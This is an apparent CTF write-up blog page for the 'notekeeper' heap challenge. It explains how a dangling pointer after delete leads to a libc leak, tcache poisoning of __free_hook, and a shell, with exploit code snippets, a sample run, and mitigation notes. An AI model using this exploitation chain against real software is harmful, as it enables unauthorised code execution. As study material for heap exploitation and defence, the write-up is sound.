@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="theme-color" content="#060606" media="(prefers-color-scheme: dark)">
+<meta name="theme-color" content="#f3f3f3" media="(prefers-color-scheme: light)">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>writeup: notekeeper — a UAF from menu to shell — algoatson.github.io</title>
+<meta name="description" content="A textbook menu-driven heap challenge, start to finish. A dangling pointer after delete gives a read and a write on freed memory; the unsorted bin leaks libc, tcache poisoning aims a freed chunk at __free_hook, and the program frees its way into a shell.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/writeup-notekeeper-uaf/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="writeup: notekeeper — a UAF from menu to shell — algoatson.github.io">
+<meta property="og:description" content="A textbook menu-driven heap challenge, start to finish. A dangling pointer after delete gives a read and a write on freed memory; the unsorted bin leaks libc, tcache poisoning aims a freed chunk at __free_hook, and the program frees its way into a shell.">
+<meta property="og:url" content="https://algoatson.github.io/p/writeup-notekeeper-uaf/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/writeup-notekeeper-uaf.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="preload" href="/assets/vga.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "writeup: notekeeper — a UAF from menu to shell", "datePublished": "2026-05-18", "dateModified": "2026-05-18", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "A textbook menu-driven heap challenge, start to finish. A dangling pointer after delete gives a read and a write on freed memory; the unsorted bin leaks libc, tcache poisoning aims a freed chunk at __free_hook, and the program frees its way into a shell.", "url": "https://algoatson.github.io/p/writeup-notekeeper-uaf/", "mainEntityOfPage": "https://algoatson.github.io/p/writeup-notekeeper-uaf/", "keywords": "pwn, heap, ctf"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/series/">series</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>writeup: notekeeper — a UAF from menu to shell</h1>
+  <div class="meta"><span>2026-05-18</span><span>3 min read</span><a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/ctf/">ctf</a></div>
+</header>
+
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#recon-four-verbs-over-the-heap">recon — four verbs over the heap</a></li>
+<li><a href="#step-1-leak-libc-through-the-unsorted-bin">step 1 — leak libc through the unsorted bin</a></li>
+<li><a href="#step-2-tcache-poisoning-to-__free_hook">step 2 — tcache poisoning to __free_hook</a></li>
+<li><a href="#step-3-free-your-way-to-a-shell">step 3 — free your way to a shell</a></li>
+<li><a href="#what-made-it-easy-and-what-234-would-change">what made it easy, and what 2.34 would change</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p><code class="highlight">notekeeper</code> is the archetypal CTF heap binary: a menu that creates, edits, shows,
+and deletes notes. Those four verbs are also the four heap primitives you need —
+the only bug is that <em>delete</em> forgets to clear the pointer. Here's the whole chain.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./notekeeper</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.31</dd></div></dl><ul class="target__mits"><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">RELRO</span><span class="lead" aria-hidden="true"></span><span class="mv">full</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">canary</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">NX</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li><li class="m-on"><span class="g" aria-hidden="true">✓</span><span class="mk">PIE</span><span class="lead" aria-hidden="true"></span><span class="mv">on</span></li></ul></div></figure>
+<h2 id="recon-four-verbs-over-the-heap">recon — four verbs over the heap<a class="headerlink" href="#recon-four-verbs-over-the-heap" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="fname">the menu</span><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#the-menu-1">1</a></span>
+<span class="normal"><a href="#the-menu-2">2</a></span>
+<span class="normal"><a href="#the-menu-3">3</a></span>
+<span class="normal"><a href="#the-menu-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="the-menu-1">1) new   &lt;idx&gt; &lt;size&gt; &lt;data&gt;     -&gt; notes[idx] = malloc(size); read data
+</span><span id="the-menu-2">2) edit  &lt;idx&gt; &lt;data&gt;            -&gt; read into notes[idx]   (no liveness check)
+</span><span id="the-menu-3">3) show  &lt;idx&gt;                   -&gt; puts(notes[idx])       (no liveness check)
+</span><span id="the-menu-4">4) free  &lt;idx&gt;                   -&gt; free(notes[idx])       (pointer NOT cleared)
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p><code class="highlight">free</code> leaves <code class="highlight">notes[idx]</code> dangling, and both <code class="highlight">edit</code> and <code class="highlight">show</code> happily operate on
+a freed index. That single oversight is a <strong>use-after-free</strong> giving me a read
+<em>and</em> a write on freed chunks — everything else follows.</p>
+<h2 id="step-1-leak-libc-through-the-unsorted-bin">step 1 — leak libc through the unsorted bin<a class="headerlink" href="#step-1-leak-libc-through-the-unsorted-bin" title="Permanent link">#</a></h2>
+<p>A chunk too big for a tcache bin (&gt;0x408) goes to the <strong>unsorted bin</strong> on free,
+and its <code class="highlight">fd</code>/<code class="highlight">bk</code> get set to a <code class="highlight">main_arena</code> address inside libc. <code class="highlight">show</code> on that
+freed chunk reads those bytes back:</p>
+<figure class="codeblock"><figcaption><span class="fname">leak.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#leakpy-1">1</a></span>
+<span class="normal"><a href="#leakpy-2">2</a></span>
+<span class="normal"><a href="#leakpy-3">3</a></span>
+<span class="normal"><a href="#leakpy-4">4</a></span>
+<span class="normal"><a href="#leakpy-5">5</a></span>
+<span class="normal"><a href="#leakpy-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="leakpy-1"><span class="n">new</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x420</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>     <span class="c1"># large -&gt; skips tcache</span>
+</span><span id="leakpy-2"><span class="n">new</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;guard&quot;</span><span class="p">)</span>    <span class="c1"># stop consolidation into the top chunk</span>
+</span><span id="leakpy-3"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                   <span class="c1"># chunk 0 -&gt; unsorted bin, fd/bk = main_arena+96</span>
+</span><span id="leakpy-4"><span class="hll"><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">show</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+</span></span><span id="leakpy-5"><span class="hll"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;main_arena&quot;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span>   <span class="c1"># rebase libc</span>
+</span></span><span id="leakpy-6"><span class="hll"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;libc @ </span><span class="si">{</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="si">:</span><span class="s2">#x</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+</span></span></code></pre></div></td></tr></table></div>
+</figure>
+<p>With full RELRO the GOT is read-only, so I can't redirect a PLT call — but glibc
+2.31 still has <code class="highlight">__free_hook</code>, and that's writable.</p>
+<h2 id="step-2-tcache-poisoning-to-__free_hook">step 2 — tcache poisoning to __free_hook<a class="headerlink" href="#step-2-tcache-poisoning-to-__free_hook" title="Permanent link">#</a></h2>
+<p><a href="/p/tcache-poisoning-explained/">tcache poisoning</a>: free a small chunk into a
+tcache bin, then use the UAF <code class="highlight">edit</code> to overwrite its <code class="highlight">fd</code> (the <code class="highlight">next</code> pointer) with
+the address I want allocated. The next two <code class="highlight">malloc</code>s of that size return first the
+real chunk, then <strong>my chosen address</strong>:</p>
+<figure class="codeblock"><figcaption><span class="fname">poison.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#poisonpy-1">1</a></span>
+<span class="normal"><a href="#poisonpy-2">2</a></span>
+<span class="normal"><a href="#poisonpy-3">3</a></span>
+<span class="normal"><a href="#poisonpy-4">4</a></span>
+<span class="normal"><a href="#poisonpy-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="poisonpy-1"><span class="n">new</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;B&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+</span><span id="poisonpy-2"><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>                                  <span class="c1"># chunk 2 -&gt; 0x40 tcache bin</span>
+</span><span id="poisonpy-3"><span class="hll"><span class="n">edit</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;__free_hook&quot;</span><span class="p">]))</span>    <span class="c1"># UAF: overwrite tcache fd -&gt; __free_hook</span>
+</span></span><span id="poisonpy-4"><span class="hll"><span class="n">new</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">)</span>             <span class="c1"># pops chunk 2; also stage &quot;/bin/sh&quot;</span>
+</span></span><span id="poisonpy-5"><span class="hll"><span class="n">new</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]))</span>    <span class="c1"># this alloc == __free_hook; write system</span>
+</span></span></code></pre></div></td></tr></table></div>
+</figure>
+<p>Now <code class="highlight">__free_hook == system</code>, and note 3 holds <code class="highlight">&quot;/bin/sh&quot;</code>.</p>
+<h2 id="step-3-free-your-way-to-a-shell">step 3 — free your way to a shell<a class="headerlink" href="#step-3-free-your-way-to-a-shell" title="Permanent link">#</a></h2>
+<p><code class="highlight">free(p)</code> calls <code class="highlight">__free_hook(p)</code> if it's set — which is now <code class="highlight">system(p)</code>. So freeing
+the chunk that contains <code class="highlight">&quot;/bin/sh&quot;</code> runs <code class="highlight">system(&quot;/bin/sh&quot;)</code>:</p>
+<figure class="codeblock"><figcaption><span class="fname">win.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#winpy-1">1</a></span>
+<span class="normal"><a href="#winpy-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="winpy-1"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>            <span class="c1"># __free_hook(&quot;/bin/sh&quot;) -&gt; system(&quot;/bin/sh&quot;)</span>
+</span><span id="winpy-2"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>flag</summary>
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span>
+<span class="normal"><a href="#code-2">2</a></span>
+<span class="normal"><a href="#code-3">3</a></span>
+<span class="normal"><a href="#code-4">4</a></span>
+<span class="normal"><a href="#code-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">$ ./exploit.py REMOTE
+</span><span id="code-2">[+] libc @ 0x7f3c2a1e2000
+</span><span id="code-3">[*] Switching to interactive mode
+</span><span id="code-4">$ id &amp;&amp; cat flag
+</span><span id="code-5">uid=1000 ... segfault{f0rg0t_t0_null_th3_p0inter}
+</span></code></pre></div></td></tr></table></div>
+</figure>
+</details>
+<h2 id="what-made-it-easy-and-what-234-would-change">what made it easy, and what 2.34 would change<a class="headerlink" href="#what-made-it-easy-and-what-234-would-change" title="Permanent link">#</a></h2>
+<ul>
+<li><strong>The whole exploit is one bug.</strong> A missing <code class="highlight">notes[idx] = NULL</code> after <code class="highlight">free</code>
+  turned four benign verbs into read/write-after-free. Liveness checks (and zeroing
+  freed pointers) kill it dead.</li>
+<li><strong><code class="highlight">__free_hook</code> is a 2.31 luxury.</strong> On glibc ≥ 2.34 the hook is gone, so the same
+  tcache poison would aim at a saved return address or pivot into
+  <a href="/p/house-of-apple-2/">House of Apple 2</a> FSOP instead. The leak and the poison are
+  identical; only the final target moves.</li>
+<li><strong>PIE + full RELRO + canary didn't matter.</strong> None of them touch a heap UAF; the
+  libc leak handled ASLR, and I never went near a return address or the GOT.</li>
+</ul>
+<p>notekeeper is worth keeping as a reference shape: when you see create/edit/show/
+delete over an array of pointers, the first thing to check is whether <em>delete</em>
+clears the slot. Half the time it doesn't, and the other three verbs hand you the
+exploit.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><div class="row"><span class="row__date">2026-06-15</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-apple-2/">House of Apple 2 — FSOP after the hooks died</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-14</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/house-of-spirit/">the House of Spirit</a><span class="row__min">4 min</span></div><div class="row"><span class="row__date">2026-06-14</span><a class="row__tag" href="/tags/heap/">heap</a><a class="row__title" href="/p/poison-null-byte/">the poison null byte</a><span class="row__min">3 min</span></div></div></section>
+<nav class="pager"><a class="prev" href="/p/checksec-everything/"><span class="lbl">&#8249; newer</span>one keybind to checksec everything</a><a class="next" href="/p/finding-gadgets/"><span class="lbl">older &#8250;</span>finding gadgets: ROPgadget, ropper, one_gadget, pwntools</a></nav></main>
+
+    <footer class="status">
+      <span>48 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h2>keys</h2><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
